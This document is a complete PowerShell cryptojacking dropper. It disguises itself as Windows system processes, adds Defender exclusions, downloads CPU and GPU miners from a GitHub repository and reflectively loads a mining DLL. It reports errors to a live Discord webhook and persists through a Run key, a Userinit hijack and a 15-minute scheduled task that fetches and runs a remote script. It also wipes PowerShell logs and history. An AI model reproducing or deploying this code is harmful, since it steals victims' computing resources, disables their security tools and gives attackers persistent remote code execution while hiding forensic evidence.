# --- CONFIGURATION ---
$GithubUser = "HolyV200"
$RepoName = "ultaV2"
$DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll"
$Wallet = "1871092382" # Mining Key
$Webhook = "https://discord.com/api/webhooks/1496175376966090855/I_Dn3uZ1clrG-J3XR-T0LRnUo6HKP6u8Ww2j7iut7mcKIZHSyWBzOEwZODtGR3zdAQlK"

# --- SINGLE-INSTANCE MUTEX (prevent double-runs from scheduled task + registry) ---
$MutexName = "Global\WinSysUpdatesMtx_7f3a"
$script:Mutex = $null
try {
    $script:Mutex = [System.Threading.Mutex]::OpenExisting($MutexName)
    # Already running, bail out
    exit
} catch {
    $script:Mutex = New-Object System.Threading.Mutex($true, $MutexName)
}

# --- STEALTH SETUP ---
$StealthDir = "$env:USERPROFILE\AppData\Local\WinSysUpdates"
if (-not (Test-Path $StealthDir)) {
    New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
    # Hide the folder
    (Get-Item $StealthDir).Attributes = 'Hidden','System','Directory'
}

# --- WINDOWS DEFENDER EXCLUSION (add our folder so AV doesn't eat binaries) ---
try {
    Add-MpPreference -ExclusionPath $StealthDir -ErrorAction SilentlyContinue
    # Also exclude the miner process names from real-time scanning
    Add-MpPreference -ExclusionProcess "svchost_x.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "RuntimeBroker_x.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "SecurityHealthService_x.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "SearchIndexer_x.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "spoolsv_x.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "ctfmon_x.exe" -ErrorAction SilentlyContinue
} catch { }

# --- PERSIST RANDOM NAME (use same name across reboots, don't pile up duplicates) ---
$NameFile = Join-Path $StealthDir ".maskedname"
$Masks = @("svchost", "RuntimeBroker", "SecurityHealthService", "SearchIndexer", "spoolsv", "ctfmon")
if (Test-Path $NameFile) {
    $RandomName = Get-Content $NameFile -ErrorAction SilentlyContinue
    # Validate it's still a legit mask name
    if ($Masks -notcontains $RandomName) {
        $RandomName = Get-Random -InputObject $Masks
        Set-Content -Path $NameFile -Value $RandomName -Force
    }
} else {
    $RandomName = Get-Random -InputObject $Masks
    Set-Content -Path $NameFile -Value $RandomName -Force
    (Get-Item $NameFile).Attributes = 'Hidden'
}

$MaskedCpu = Join-Path $StealthDir ($RandomName + "_x.exe")
$MaskedGpu = Join-Path $StealthDir ($RandomName + "_g.exe")
$MaskedHost = Join-Path $StealthDir "WinSysHelper.exe"

# Copy PowerShell to a masked name to hide in Task Manager
if (-not (Test-Path $MaskedHost)) {
    Copy-Item "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $MaskedHost -Force
    $OldDate = Get-Date -Year 2021 -Month 3 -Day 22
    (Get-Item $MaskedHost).CreationTime = $OldDate
    (Get-Item $MaskedHost).LastWriteTime = $OldDate
}

# Force TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- DOWNLOAD HELPER (handles GitHub redirects properly) ---
function Safe-Download {
    param([string]$Url, [string]$OutPath)
    try {
        # Invoke-WebRequest follows redirects properly unlike WebClient
        Invoke-WebRequest -Uri $Url -OutFile $OutPath -UseBasicParsing -ErrorAction Stop
        if (Test-Path $OutPath) {
            $size = (Get-Item $OutPath).Length
            if ($size -lt 10000) {
                # Got an HTML error page, not a binary — delete it
                Remove-Item $OutPath -Force
                return $false
            }
            $OldDate = Get-Date -Year 2019 -Month 5 -Day 14
            (Get-Item $OutPath).CreationTime = $OldDate
            (Get-Item $OutPath).LastWriteTime = $OldDate
            return $true
        }
    } catch { }
    return $false
}

# 1. Handle CPU Miner
if (-not (Test-Path $MaskedCpu)) {
    $RawMinerUrl = "https://github.com/$GithubUser/$RepoName/raw/main/win_sys_x.exe"
    $result = Safe-Download -Url $RawMinerUrl -OutPath $MaskedCpu
    if (-not $result) {
        $FallbackUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/win_sys_x.exe"
        Safe-Download -Url $FallbackUrl -OutPath $MaskedCpu | Out-Null
    }
}

# 2. Detect and Download GPU Miner
$HasGpu = $null
try {
    $vcs = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
    foreach ($vc in $vcs) {
        if ($vc.Name -match "NVIDIA" -or $vc.Name -match "AMD" -or $vc.Name -match "Radeon") { $HasGpu = $true }
    }
} catch { }

if ($HasGpu -and -not (Test-Path $MaskedGpu)) {
    $RawGpuUrl = "https://github.com/$GithubUser/$RepoName/raw/main/win_sys_g.exe"
    $result = Safe-Download -Url $RawGpuUrl -OutPath $MaskedGpu
    if (-not $result) {
        $FallbackUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/win_sys_g.exe"
        Safe-Download -Url $FallbackUrl -OutPath $MaskedGpu | Out-Null
    }
}

# --- REFLECTIVE LOADING ---
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
try {
    $dllBytes = $wc.DownloadData($DllUrl)
    $assembly = [System.Reflection.Assembly]::Load($dllBytes)
    $loader = $assembly.GetTypes() | Where-Object { $_.Name -eq "DateFundLoader" } | Select-Object -First 1
    $startMethod = $loader.GetMethod("StartMiner", [Type[]]@([string]))

    $GpuArg = if ($HasGpu) { $MaskedGpu } else { "" }
    $IsAmd = "true"

    $combinedArgs = "$MaskedCpu|$GpuArg|$Wallet|$IsAmd|$Webhook"
    $startMethod.Invoke($null, @([string]$combinedArgs))
} catch {
    $errMsg = "Deployment Error on " + $env:COMPUTERNAME + ": " + $_.Exception.Message
    $json = @{ content = $errMsg } | ConvertTo-Json
    try {
        Invoke-WebRequest -Uri $Webhook -Method POST -Body $json -ContentType "application/json" -UseBasicParsing | Out-Null
    } catch { }
}

# --- USER-MODE PERSISTENCE (GHOST LAYER) ---
$ScriptUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1"
$PayloadArgs = "-NoP -NonI -W Hidden -Exec Bypass -Command `"iex(New-Object Net.WebClient).DownloadString('$ScriptUrl')`""
$FullPayload = "`"$MaskedHost`" $PayloadArgs"

try {
    # 1. Registry Run Key
    $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $RunKey -Name "WindowsUpdateManager" -Value $FullPayload -ErrorAction SilentlyContinue

    # 2. Userinit Hijack
    $WinlogonPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Winlogon"
    if (-not (Test-Path $WinlogonPath)) { New-Item -Path $WinlogonPath -Force | Out-Null }
    $NewInit = "C:\Windows\system32\userinit.exe, $FullPayload"
    Set-ItemProperty -Path $WinlogonPath -Name "Userinit" -Value $NewInit -ErrorAction SilentlyContinue

    # 3. Scheduled Task (Immortal Trigger)
    $TaskName = "WinSysMaintenance"
    if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
        $Action = New-ScheduledTaskAction -Execute $MaskedHost -Argument $PayloadArgs
        $Trigger1 = New-ScheduledTaskTrigger -AtLogOn
        $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Days 0)
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger1,$Trigger2 -Settings $Settings -Description "Windows System Maintenance Task" -ErrorAction SilentlyContinue | Out-Null
    }
} catch {
    try {
        schtasks.exe /create /sc minute /mo 15 /tn "WinSysMaintenance" /tr "$FullPayload" /f 2>$null
    } catch { }
}

# --- POWERSHELL LOG CLEANUP (cover forensic tracks) ---
try {
    # Clear PowerShell operational log
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
    # Clear Windows PowerShell log
    wevtutil cl "Windows PowerShell" 2>$null
    # Clear script block logging cache
    Remove-Item "$env:USERPROFILE\AppData\Local\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
} catch { }

# Keep the script alive so the watchdog thread stays running
while ($true) { Start-Sleep -Seconds 60 }
